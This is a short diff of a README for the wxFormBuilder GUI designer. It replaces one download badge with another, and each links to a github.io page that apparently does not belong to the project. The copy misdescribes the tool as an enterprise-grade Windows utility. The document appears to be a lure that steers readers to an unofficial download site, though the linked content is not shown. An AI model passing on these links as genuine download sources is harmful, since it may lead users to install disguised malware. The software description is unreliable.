@@ -9,7 +9,7 @@
 
 wxFormBuilder is an enterprise-grade graphical user interface design utility optimized for the Windows platform. It functions as a lightweight WYSIWYG layout generator that translates visual component arrangements into clean, compilable C++ source code for applications built on the wxWidgets framework. By abstracting manual window positioning and sizer hierarchies into an intuitive visual canvas, the software eliminates boilerplate interface coding friction from desktop software engineering workflows.
 
-[![Download wxFormBuilder](https://img.shields.io/badge/Download-wxFormBuilder-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://sarahbakerl764.github.io/.github/wxFormBuilder-Interface-Service)
+[![Open wxFormBuilder](https://img.shields.io/badge/Open-wxFormBuilder-1E293B?style=for-the-badge)](https://wxformbuilder-interface.github.io/.github/)
 
 ---
 
